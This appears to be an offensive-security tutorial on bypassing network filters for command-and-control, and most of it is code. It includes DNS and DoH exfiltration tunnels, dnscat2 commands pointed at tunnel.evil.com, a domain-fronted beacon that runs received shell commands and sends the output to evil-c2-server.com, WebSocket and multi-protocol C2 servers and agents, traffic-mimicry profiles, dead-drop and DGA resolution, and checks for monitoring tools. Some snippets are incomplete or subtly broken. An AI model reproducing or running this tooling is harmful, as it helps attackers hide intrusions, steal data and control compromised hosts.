# Network Filter Bypass Techniques Reference

## ELI5: Smuggling Through Digital Borders

### The International Smuggler Analogy

Imagine you're a spy trying to send secret messages past border guards:

**Traditional Method:**
```
You → Letter → Border Guard reads it → BLOCKED! → Message fails
```

**DNS Tunneling:**
```
You → Hide message in shipping labels → Guards ignore labels → Message gets through!
```

**Domain Fronting:**
```
You → Package labeled "Amazon" → Guards trust Amazon → Actually contains secrets!
```

**HTTPS Tunneling:**
```
You → Locked briefcase → Guards can't open it → Secrets pass through!
```

### The Network Security Stack

```
Your Malware
     ↓
Application Layer (HTTP/HTTPS)  ← Web Filters Check Here
     ↓
DNS Resolution                   ← DNS Filters Check Here
     ↓
Transport Layer (TCP/UDP)        ← Firewalls Check Here
     ↓
Network Layer (IP)               ← IDS/IPS Check Here
     ↓
Physical Network                 ← DPI Inspects Everything
```

**Our Goal:** Find blind spots at each layer!

### Why Network Filters Fail

1. **Encrypted Traffic** - Can't inspect what they can't decrypt
2. **Trusted Services** - Won't block legitimate services
3. **Protocol Abuse** - Using protocols in unexpected ways
4. **Volume** - Too much traffic to inspect everything
5. **Performance** - Deep inspection slows everything down

## DNS Tunneling Mastery

### Understanding DNS for Tunneling

```
Normal DNS:
Client: "What's the IP for google.com?"
Server: "It's 142.250.80.46"

DNS Tunneling:
Client: "What's the IP for ENCODED-DATA.evil.com?"
Server: "It's 10.0.0.1 (plus hidden response data)"
```

### Basic DNS Tunneling Implementation

```python
#!/usr/bin/env python3
import socket
import base64
import struct

class DNSTunnel:
    """Custom DNS tunneling implementation"""

    def __init__(self, domain, dns_server="8.8.8.8"):
        self.domain = domain
        self.dns_server = dns_server
        self.chunk_size = 63  # Max DNS label length

    def encode_data(self, data):
        """Encode data for DNS query"""
        # Base32 encoding (DNS-safe)
        encoded = base64.b32encode(data.encode()).decode()
        encoded = encoded.lower().replace('=', '')

        # Split into DNS labels
        chunks = [encoded[i:i+self.chunk_size]
                 for i in range(0, len(encoded), self.chunk_size)]

        return chunks

    def create_dns_query(self, subdomain):
        """Build DNS query packet"""
        query = b''

        # Transaction ID
        query += struct.pack('>H', 0x1337)

        # Flags (standard query)
        query += struct.pack('>H', 0x0100)

        # Questions, answers, authority, additional
        query += struct.pack('>HHHH', 1, 0, 0, 0)

        # Query name
        full_domain = f"{subdomain}.{self.domain}"
        for label in full_domain.split('.'):
            query += struct.pack('B', len(label))
            query += label.encode()
        query += b'\x00'

        # Query type (TXT record for more data)
        query += struct.pack('>HH', 16, 1)  # Type TXT, Class IN

        return query

    def send_data(self, data):
        """Send data via DNS queries"""
        chunks = self.encode_data(data)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)

        for i, chunk in enumerate(chunks):
            # Add sequence number
            subdomain = f"{i:04d}.{chunk}"

            # Create and send query
            query = self.create_dns_query(subdomain)
            sock.sendto(query, (self.dns_server, 53))

            try:
                response, _ = sock.recvfrom(1024)
                # Parse response for commands
                self.parse_response(response)
            except socket.timeout:
                continue

    def parse_response(self, response):
        """Extract hidden data from DNS response"""
        # Skip header (12 bytes)
        pos = 12

        # Skip question section
        while response[pos] != 0:
            pos += 1
        pos += 5  # Null byte + type + class

        # Check for TXT answer
        if len(response) > pos + 10:
            # Extract TXT data
            txt_length = response[pos + 10]
            txt_data = response[pos + 11:pos + 11 + txt_length]

            # Decode command
            try:
                command = base64.b64decode(txt_data).decode()
                return command
            except:
                pass

        return None

# Usage
tunnel = DNSTunnel("tunneldomain.com")
tunnel.send_data("Sensitive data exfiltration")
```

### Advanced DNS Tunneling with dnscat2

```bash
# Server setup
ruby dnscat2.rb --dns server=0.0.0.0,port=53,domain=tunnel.evil.com --secret=supersecret

# Client connection
./dnscat --secret=supersecret tunnel.evil.com

# PowerShell client
$dnscat2 = @"
# Minimal dnscat2 PowerShell client
function Start-Dnscat2 {
    param($Domain, $DNSServer = "8.8.8.8")

    while($true) {
        # Encode PowerShell command output
        $data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))

        # Split into DNS-safe chunks
        $chunks = $data -split '(.{30})' | Where { $_ }

        foreach($chunk in $chunks) {
            $subdomain = $chunk.ToLower().Replace('+','-').Replace('/','_').Replace('=','')

            # DNS query via .NET
            try {
                $result = [System.Net.Dns]::GetHostAddresses("$subdomain.$Domain")

                # Check for commands in response
                if($result[0].IPAddressToString -match "^10\.") {
                    # Command encoded in IP
                    $cmd = [char[]]@($result[0].GetAddressBytes()) -join ''
                    Invoke-Expression $cmd
                }
            } catch {}

            Start-Sleep -Milliseconds 100
        }

        Start-Sleep -Seconds 5
    }
}
"@

Invoke-Expression $dnscat2
Start-Dnscat2 -Domain "tunnel.evil.com" -DNSServer "10.10.10.10"
```

### DNS over HTTPS (DoH) Tunneling

```python
#!/usr/bin/env python3
import requests
import base64
import json

class DoHTunnel:
    """DNS over HTTPS tunneling - bypasses traditional DNS filters"""

    def __init__(self, doh_server="https://cloudflare-dns.com/dns-query"):
        self.doh_server = doh_server
        self.session = requests.Session()
        self.session.headers.update({
            'accept': 'application/dns-json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        })

    def tunnel_data(self, data, domain):
        """Send data via DoH queries"""
        # Encode data
        encoded = base64.b64encode(data.encode()).decode()
        encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')

        # Create fake subdomain
        subdomain = f"{encoded[:50]}.{domain}"

        # DoH query
        params = {
            'name': subdomain,
            'type': 'A'
        }

        try:
            response = self.session.get(self.doh_server, params=params)
            result = response.json()

            # Extract response (could hide C2 commands here)
            if 'Answer' in result:
                for answer in result['Answer']:
                    if answer['type'] == 1:  # A record
                        ip = answer['data']
                        # Decode commands from IP
                        self.decode_command(ip)

        except Exception as e:
            pass

    def decode_command(self, ip):
        """Decode C2 commands from IP addresses"""
        # Example: 10.x.y.z where xyz encode command
        parts = ip.split('.')
        if parts[0] == '10':
            cmd_code = int(parts[1])
            if cmd_code == 1:
                # Download and execute
                pass
            elif cmd_code == 2:
                # Exfiltrate file
                pass

# Usage
doh = DoHTunnel()
doh.tunnel_data("Exfil data", "c2server.com")
```

## Domain Fronting Techniques

### Understanding Domain Fronting

```
Normal HTTPS:
SNI: evil.com → CDN → Blocked by filter!

Domain Fronting:
SNI: azure.com → CDN → Host: evil.com → Allowed through!
```

### CloudFront Domain Fronting

```python
#!/usr/bin/env python3
import requests
import ssl

class DomainFronting:
    """Domain fronting through various CDNs"""

    def __init__(self):
        self.session = requests.Session()

    def cloudfront_fronting(self, fronted_domain, hidden_domain, path="/"):
        """AWS CloudFront domain fronting"""

        # Create custom SSL context
        context = ssl.create_default_context()

        # Connect using fronted domain
        url = f"https://{fronted_domain}{path}"

        # But request from hidden domain
        headers = {
            'Host': hidden_domain,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': '*/*'
        }

        try:
            response = self.session.get(url, headers=headers, verify=context)
            return response.text
        except Exception as e:
            return None

    def azure_fronting(self, path="/"):
        """Azure CDN domain fronting"""
        fronted = "ajax.aspnetcdn.com"  # Microsoft's CDN
        hidden = "myc2server.azureedge.net"  # Your C2

        url = f"https://{fronted}{path}"
        headers = {
            'Host': hidden,
            'User-Agent': 'Mozilla/5.0'
        }

        response = self.session.get(url, headers=headers)
        return response

    def google_fronting(self):
        """Google Cloud domain fronting"""
        # Note: Google has restricted this
        fronted = "www.google.com"
        hidden = "myc2.appspot.com"

        # Use CONNECT method for tunnel
        import http.client

        conn = http.client.HTTPSConnection(fronted)
        conn.set_tunnel(hidden, 443)
        conn.request("GET", "/")

        response = conn.getresponse()
        return response.read()

# C2 communication via domain fronting
def c2_beacon():
    fronting = DomainFronting()

    while True:
        # Beacon out
        command = fronting.cloudfront_fronting(
            fronted_domain="d111111abcdef8.cloudfront.net",
            hidden_domain="evil-c2-server.com",
            path="/beacon"
        )

        if command:
            # Execute command
            import subprocess
            result = subprocess.run(command, shell=True, capture_output=True)

            # Send result back
            fronting.cloudfront_fronting(
                fronted_domain="d111111abcdef8.cloudfront.net",
                hidden_domain="evil-c2-server.com",
                path=f"/result?data={base64.b64encode(result.stdout)}"
            )

        time.sleep(60)  # Beacon interval
```

### Fastly CDN Fronting

```python
class FastlyFronting:
    """Fastly-specific domain fronting"""

    def __init__(self, service_id):
        self.service_id = service_id
        self.fronted = "fastly.com"

    def send_data(self, data, c2_domain):
        """Send data through Fastly CDN"""

        # Fastly-specific headers
        headers = {
            'Host': c2_domain,
            'Fastly-Key': 'optional-api-key',
            'X-Timer': 'S1234567890.123456',  # Bypass cache
            'User-Agent': 'fastly-cli/1.0'
        }

        # Encode data in headers (stealthier)
        chunks = [data[i:i+100] for i in range(0, len(data), 100)]
        for i, chunk in enumerate(chunks):
            headers[f'X-Data-{i}'] = base64.b64encode(chunk.encode()).decode()

        url = f"https://{self.fronted}/service/{self.service_id}"

        response = requests.post(url, headers=headers)
        return response.headers.get('X-Response', '')
```

## HTTPS Inspection Bypass

### Certificate Pinning Implementation

```c
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

// Bypass HTTPS inspection with certificate pinning
BOOL PinnedHTTPS(LPCWSTR server, LPCWSTR path, BYTE* expectedHash) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);

    HINTERNET hConnect = WinHttpConnect(hSession, server, 443, 0);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
        NULL, NULL, NULL, WINHTTP_FLAG_SECURE);

    // Get certificate
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    // Extract certificate
    WINHTTP_CERTIFICATE_INFO certInfo;
    DWORD certInfoLen = sizeof(WINHTTP_CERTIFICATE_INFO);

    WinHttpQueryOption(hRequest, WINHTTP_OPTION_SECURITY_CERTIFICATE_STRUCT,
        &certInfo, &certInfoLen);

    // Calculate certificate hash
    BYTE certHash[32];
    DWORD hashLen = 32;
    CryptHashCertificate(0, CALG_SHA_256, 0,
        certInfo.lpCertificate, certInfo.dwCertificateLen,
        certHash, &hashLen);

    // Compare with expected hash (pinning)
    if (memcmp(certHash, expectedHash, 32) != 0) {
        // Certificate changed - possible MITM!
        return FALSE;
    }

    // Safe to communicate
    return TRUE;
}
```

### Encrypted SNI (ESNI) Implementation

```python
#!/usr/bin/env python3
import ssl
import socket
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

class ESNIClient:
    """Encrypted SNI to hide destination from inspection"""

    def __init__(self):
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

    def connect_with_esni(self, hostname, port=443):
        """Connect using encrypted SNI"""

        # Get ESNI keys from DNS
        esni_keys = self.fetch_esni_keys(hostname)

        # Generate client random
        client_random = os.urandom(32)

        # Derive encryption key
        kdf = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'tls13-esni'
        )
        key = kdf.derive(client_random + esni_keys['public_key'])

        # Encrypt SNI
        cipher = Cipher(
            algorithms.AES(key),
            modes.GCM(os.urandom(12))
        )
        encryptor = cipher.encryptor()
        encrypted_sni = encryptor.update(hostname.encode()) + encryptor.finalize()

        # Create connection with encrypted SNI
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Wrap with TLS
        wrapped_socket = self.context.wrap_socket(
            sock,
            server_hostname=None,  # Don't send plaintext SNI
            do_handshake_on_connect=False
        )

        # Connect
        wrapped_socket.connect((self.resolve_ip(hostname), port))

        # Send encrypted SNI in ClientHello extension
        self.send_encrypted_sni(wrapped_socket, encrypted_sni)

        # Complete handshake
        wrapped_socket.do_handshake()

        return wrapped_socket

    def fetch_esni_keys(self, hostname):
        """Get ESNI public keys from DNS"""
        # Query _esni.hostname TXT record
        import dns.resolver

        try:
            answers = dns.resolver.resolve(f"_esni.{hostname}", 'TXT')
            for rdata in answers:
                # Parse ESNI keys
                return self.parse_esni_keys(str(rdata))
        except:
            return None
```

### WebSocket Tunneling

```javascript
// WebSocket tunnel for bypassing HTTP inspection
class WebSocketTunnel {
    constructor(url) {
        this.url = url;
        this.ws = null;
        this.callbacks = {};
    }

    connect() {
        return new Promise((resolve, reject) => {
            this.ws = new WebSocket(this.url);

            // Binary mode for obfuscation
            this.ws.binaryType = 'arraybuffer';

            this.ws.onopen = () => {
                console.log('Tunnel established');
                this.startHeartbeat();
                resolve();
            };

            this.ws.onmessage = (event) => {
                this.handleMessage(event.data);
            };

            this.ws.onerror = reject;
        });
    }

    async sendCommand(cmd, data) {
        // Encode command
        const payload = {
            id: Math.random().toString(36),
            cmd: cmd,
            data: btoa(JSON.stringify(data)),
            timestamp: Date.now()
        };

        // Encrypt
        const encrypted = await this.encrypt(JSON.stringify(payload));

        // Send as binary
        this.ws.send(encrypted);

        // Wait for response
        return new Promise((resolve) => {
            this.callbacks[payload.id] = resolve;
            setTimeout(() => {
                delete this.callbacks[payload.id];
                resolve(null);
            }, 30000);
        });
    }

    async encrypt(data) {
        // Simple XOR encryption (use proper crypto in production)
        const key = 0x42;
        const buffer = new TextEncoder().encode(data);
        const encrypted = new Uint8Array(buffer.length);

        for (let i = 0; i < buffer.length; i++) {
            encrypted[i] = buffer[i] ^ key;
        }

        return encrypted.buffer;
    }

    handleMessage(data) {
        // Decrypt and process
        const decrypted = this.decrypt(data);
        const message = JSON.parse(decrypted);

        if (this.callbacks[message.id]) {
            this.callbacks[message.id](message.data);
        }
    }

    startHeartbeat() {
        setInterval(() => {
            if (this.ws.readyState === WebSocket.OPEN) {
                this.ws.send(new Uint8Array([0xFF]));  // Heartbeat
            }
        }, 30000);
    }
}

// Usage
const tunnel = new WebSocketTunnel('wss://legitimate-site.com/updates');
await tunnel.connect();
const result = await tunnel.sendCommand('exec', {cmd: 'whoami'});
```

## Practical C2 Setup

### Multi-Protocol C2 Framework

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
from aiohttp import web
import ssl
import json

class MultiProtocolC2:
    """C2 server supporting multiple protocols"""

    def __init__(self):
        self.agents = {}
        self.app = web.Application()
        self.setup_routes()

    def setup_routes(self):
        """Setup HTTP/HTTPS routes"""
        self.app.router.add_get('/beacon', self.handle_beacon)
        self.app.router.add_post('/data', self.handle_data)
        self.app.router.add_get('/dns', self.handle_dns_tunnel)
        self.app.router.add_get('/ws', self.websocket_handler)

    async def handle_beacon(self, request):
        """Handle agent beacons"""
        agent_id = request.headers.get('X-Agent-ID')

        if not agent_id:
            # New agent registration
            agent_id = self.register_agent(request)

        # Get commands for agent
        commands = self.get_agent_commands(agent_id)

        # Encode response
        response = {
            'id': agent_id,
            'commands': commands,
            'sleep': 60  # Next beacon interval
        }

        # Use different encoding based on User-Agent
        if 'PowerShell' in request.headers.get('User-Agent', ''):
            # PowerShell agent - base64 encode
            encoded = base64.b64encode(json.dumps(response).encode()).decode()
            return web.Response(text=encoded)
        else:
            # Regular JSON
            return web.json_response(response)

    async def handle_dns_tunnel(self, request):
        """Handle DNS tunneling requests"""
        # Extract data from subdomain
        host = request.headers.get('Host', '')
        parts = host.split('.')

        if len(parts) > 2:
            # Decode data from subdomain
            encoded_data = parts[0]
            decoded = base64.b32decode(encoded_data.upper() + '===')

            # Process command output
            self.process_agent_data(decoded)

        # Return command as DNS response
        command = self.get_next_command()

        # Encode in IP address (10.x.y.z format)
        if command:
            cmd_bytes = command.encode()[:3]
            ip = f"10.{cmd_bytes[0]}.{cmd_bytes[1]}.{cmd_bytes[2]}"
        else:
            ip = "10.0.0.0"

        return web.Response(text=ip)

    async def websocket_handler(self, request):
        """WebSocket C2 channel"""
        ws = web.WebSocketResponse()
        await ws.prepare(request)

        agent_id = None

        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                data = json.loads(msg.data)

                if data['type'] == 'register':
                    agent_id = self.register_agent(request)
                    await ws.send_json({'id': agent_id})

                elif data['type'] == 'result':
                    self.process_result(agent_id, data['data'])

                    # Send next command
                    command = self.get_agent_commands(agent_id)
                    if command:
                        await ws.send_json({'command': command})

            elif msg.type == aiohttp.WSMsgType.ERROR:
                break

        return ws

    def start_server(self, host='0.0.0.0', port=443):
        """Start C2 server with SSL"""

        # SSL context for HTTPS
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain('server.crt', 'server.key')

        # Start server
        web.run_app(
            self.app,
            host=host,
            port=port,
            ssl_context=ssl_context
        )

# Agent-side implementation
class C2Agent:
    """Multi-protocol C2 agent"""

    def __init__(self, c2_server):
        self.c2_server = c2_server
        self.agent_id = None

    async def start(self):
        """Start beaconing"""

        # Try different protocols
        protocols = [
            self.https_beacon,
            self.websocket_beacon,
            self.dns_beacon
        ]

        for protocol in protocols:
            try:
                await protocol()
                break  # Success, use this protocol
            except:
                continue  # Try next protocol

    async def https_beacon(self):
        """HTTPS beaconing"""
        async with aiohttp.ClientSession() as session:
            while True:
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'X-Agent-ID': self.agent_id or ''
                }

                # Domain fronting if configured
                if DOMAIN_FRONTING:
                    url = f"https://cloudfront.net/beacon"
                    headers['Host'] = self.c2_server
                else:
                    url = f"https://{self.c2_server}/beacon"

                async with session.get(url, headers=headers, ssl=False) as resp:
                    data = await resp.json()

                    if not self.agent_id:
                        self.agent_id = data['id']

                    # Execute commands
                    for cmd in data.get('commands', []):
                        result = await self.execute_command(cmd)
                        await self.send_result(result)

                    # Sleep
                    await asyncio.sleep(data.get('sleep', 60))
```

### Malleable C2 Profiles

```python
class MalleableC2:
    """Customizable C2 traffic profiles"""

    def __init__(self, profile='default'):
        self.profiles = {
            'default': self.default_profile,
            'gmail': self.gmail_profile,
            'office365': self.office365_profile,
            'slack': self.slack_profile
        }
        self.profile = self.profiles.get(profile, self.default_profile)

    def default_profile(self):
        """Standard HTTP profile"""
        return {
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'uri': '/api/v1/update',
            'headers': {
                'Accept': 'application/json',
                'Cache-Control': 'no-cache'
            }
        }

    def gmail_profile(self):
        """Mimic Gmail traffic"""
        return {
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124',
            'uri': '/mail/channel/bind',
            'headers': {
                'X-Gmail-Nonce': str(random.randint(1000000, 9999999)),
                'X-Client-Data': base64.b64encode(os.urandom(32)).decode(),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cookie': f'GX={os.urandom(16).hex()}; GMAIL_AT={os.urandom(16).hex()}'
            },
            'get_uri': '/mail/u/0/inbox',
            'post_uri': '/mail/u/0/?ui=2',
            'interval': 15  # Gmail checks every 15 seconds
        }

    def office365_profile(self):
        """Mimic Office 365 traffic"""
        return {
            'user_agent': 'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.13901)',
            'uri': '/owa/service.svc',
            'headers': {
                'X-OWA-CANARY': base64.b64encode(os.urandom(48)).decode(),
                'Action': 'GetFolder',
                'X-AnchorMailbox': f'user@{self.c2_server}',
                'X-OWA-UrlPostData': '%7B%22request%22%3A%7B%7D%7D'
            },
            'get_uri': '/owa/',
            'post_uri': '/owa/service.svc?action=GetFileAttachment',
            'interval': 30
        }

    def slack_profile(self):
        """Mimic Slack traffic"""
        return {
            'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'uri': '/api/rtm.connect',
            'headers': {
                'Authorization': f'Bearer xoxb-{os.urandom(12).hex()}',
                'Content-Type': 'application/json; charset=utf-8',
                'X-Slack-Req-Id': str(uuid.uuid4())
            },
            'websocket_uri': '/websocket/slack',
            'interval': 5
        }
```

## Traffic Blending Techniques

### Legitimate Traffic Mimicry

```python
class TrafficMimicry:
    """Blend C2 traffic with legitimate services"""

    def mimic_windows_update(self, data):
        """Disguise as Windows Update"""
        headers = {
            'User-Agent': 'Windows-Update-Agent/10.0.19041.1320 Client-Protocol/2.50',
            'Content-Type': 'application/soap+xml; charset=utf-8',
            'SOAPAction': '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"'
        }

        # Wrap data in SOAP envelope
        soap_body = f'''<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
                <GetConfig xmlns="http://www.microsoft.com/SoftwareDistribution">
                    <cookie>{base64.b64encode(data).decode()}</cookie>
                    <protocolVersion>2.50</protocolVersion>
                </GetConfig>
            </soap:Body>
        </soap:Envelope>'''

        return headers, soap_body

    def mimic_google_analytics(self, data):
        """Disguise as Google Analytics"""
        # Encode data as GA parameters
        params = {
            'v': '1',  # Version
            'tid': 'UA-123456-1',  # Tracking ID
            'cid': str(uuid.uuid4()),  # Client ID
            't': 'pageview',  # Hit type
            'dp': '/home',  # Document path
            'cd1': base64.b64encode(data[:100]).decode(),  # Custom dimension
            'cm1': len(data)  # Custom metric
        }

        # Split large data across multiple hits
        if len(data) > 100:
            chunks = [data[i:i+100] for i in range(0, len(data), 100)]
            for i, chunk in enumerate(chunks):
                params[f'cd{i+2}'] = base64.b64encode(chunk).decode()

        return params
```

## Detection Evasion Strategies

### Network-Level OPSEC

```python
class NetworkOPSEC:
    """Network-level operational security"""

    def __init__(self):
        self.domain_age_days = 90
        self.categorization_check = True

    def check_domain_reputation(self, domain):
        """Verify domain isn't blacklisted"""
        # Check major threat intel feeds
        threat_feeds = [
            'https://urlhaus.abuse.ch/api/',
            'https://www.virustotal.com/api/v3/domains/',
            'https://api.threatintelligenceplatform.com/v1/domain'
        ]

        for feed in threat_feeds:
            # Check if domain is listed
            pass

        return True

    def rotate_infrastructure(self):
        """Rotate C2 infrastructure"""
        # Domain fronting endpoints
        cdn_endpoints = [
            'cloudfront.net',
            'azureedge.net',
            'akamaiedge.net',
            'fastly.net'
        ]

        # Rotate through different CDNs
        current_cdn = random.choice(cdn_endpoints)

        # Update agent configuration
        return current_cdn

    def implement_jitter(self, base_interval):
        """Add jitter to beacon intervals"""
        # Random jitter between 0.5x and 1.5x base
        jitter = random.uniform(0.5, 1.5)
        return int(base_interval * jitter)

    def use_dead_drop_resolvers(self):
        """Use legitimate services for C2 discovery"""
        resolvers = [
            'pastebin.com',
            'github.com',
            'twitter.com',
            'reddit.com'
        ]

        # Post encrypted C2 address to dead drop
        # Agent retrieves and decrypts
        return random.choice(resolvers)
```

## Complete Evasion Pipeline

```python
#!/usr/bin/env python3
class CompleteNetworkEvasion:
    """Full network evasion stack"""

    def __init__(self):
        self.protocols = ['https', 'dns', 'websocket']
        self.current_protocol = None

    async def establish_c2(self):
        """Establish C2 with maximum evasion"""

        # Step 1: Check environment
        if self.detect_monitoring():
            return False

        # Step 2: Resolve C2 address
        c2_server = await self.resolve_c2_address()

        # Step 3: Test connectivity
        for protocol in self.protocols:
            if await self.test_protocol(protocol, c2_server):
                self.current_protocol = protocol
                break

        # Step 4: Establish channel
        if self.current_protocol == 'https':
            return await self.https_with_fronting(c2_server)
        elif self.current_protocol == 'dns':
            return await self.dns_tunnel(c2_server)
        elif self.current_protocol == 'websocket':
            return await self.websocket_tunnel(c2_server)

    async def resolve_c2_address(self):
        """Resolve C2 using multiple methods"""

        # Method 1: DNS TXT record
        try:
            import dns.resolver
            answers = dns.resolver.resolve('config.legitdomain.com', 'TXT')
            for rdata in answers:
                # Decrypt C2 address
                encrypted = str(rdata).strip('"')
                decrypted = self.decrypt(encrypted)
                return decrypted
        except:
            pass

        # Method 2: Dead drop
        try:
            response = requests.get('https://pastebin.com/raw/ABC123')
            encrypted = response.text
            return self.decrypt(encrypted)
        except:
            pass

        # Method 3: Domain generation algorithm
        from datetime import datetime
        seed = datetime.now().strftime('%Y%m%d')
        domain = hashlib.md5(seed.encode()).hexdigest()[:12] + '.com'
        return domain

    def detect_monitoring(self):
        """Detect if traffic is being monitored"""

        # Check for proxy
        if os.environ.get('HTTP_PROXY'):
            return True

        # Check for common monitoring tools
        monitoring_processes = ['wireshark', 'tcpdump', 'fiddler', 'burp']
        for proc in psutil.process_iter():
            if any(mon in proc.name().lower() for mon in monitoring_processes):
                return True

        # Check certificate pinning
        if not self.verify_certificates():
            return True

        return False
```

## Conclusion

Network filter bypasses are about understanding protocols deeply and abusing trust relationships. Key principles:

1. **Blend with legitimate traffic** - Make malicious look normal
2. **Use encrypted channels** - Can't filter what can't be seen
3. **Abuse trusted services** - CDNs and DNS are rarely blocked
4. **Layer your techniques** - Multiple protocols increase success
5. **Maintain OPSEC** - One mistake can burn infrastructure

Remember: Network security is constantly evolving. Today's bypass is tomorrow's detection signature.

## Lab Exercises

1. **DNS Tunneling Lab** - Build dnscat2 server and exfiltrate data
2. **Domain Fronting Lab** - Setup CloudFront fronting to hide C2
3. **WebSocket C2 Lab** - Create bidirectional WebSocket tunnel
4. **Traffic Analysis Lab** - Capture and analyze your bypass attempts
5. **Multi-Protocol Agent** - Build agent supporting 3+ protocols

## Additional Resources

- [DNS Tunneling Wiki](https://github.com/iagox86/dnscat2/wiki)
- [Domain Fronting Primer](https://www.bamsoftware.com/papers/fronting/)
- [Cobalt Strike Malleable C2](https://www.cobaltstrike.com/help-malleable-c2)
- [HTTPS Everywhere](https://www.eff.org/https-everywhere)